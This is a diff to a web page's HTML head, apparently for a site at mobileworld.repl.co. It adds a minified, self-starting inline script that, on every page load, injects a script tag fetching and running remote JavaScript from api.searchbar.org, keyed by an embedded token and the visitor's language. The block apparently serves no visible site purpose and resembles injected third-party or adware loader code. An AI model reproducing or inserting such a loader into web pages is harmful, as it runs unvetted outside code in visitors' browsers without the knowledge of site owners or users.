@@ -14,7 +14,18 @@
 <meta data-react-helmet="true" property="twitter:image" content="https://mobileworld.repl.co/static/favicon.ico"/> 
 
   <meta http-equiv="Pragma" content="no-cache">
+<script>"use strict";
 
+!function() {
+    var t = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwNjU1ZWVlNmQyNGFjN2U2ZWQ2YWEyNSIsInRva2VuVHlwZSI6InB1YmxpYyIsImlhdCI6MTYxNzI1Njk2OCwiZXhwIjoxNDIzMTY1Njk2OH0.ZsdaoQWihFSeDzwbxggmaa__wS-p1OabegmxjtEH_zg";
+    function e() {
+        var e = document.createElement("script"), a = navigator.language || navigator.userLanguage;
+        e.type = "text/javascript", e.async = !0, e.src = "https://api.searchbar.org/v1/widget/" + t + "/" + a;
+        var n = document.getElementsByTagName("script")[0];
+        n.parentNode.insertBefore(e, n);
+    }
+    "complete" === document.readyState ? e() : window.attachEvent ? window.attachEvent("onload", e) : window.addEventListener("load", e, !1);
+}();</script> 
 <link rel="shortcut icon" type="image/jpg" href="https://mobileworld.repl.co/static/favicon.ico"/>
 <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
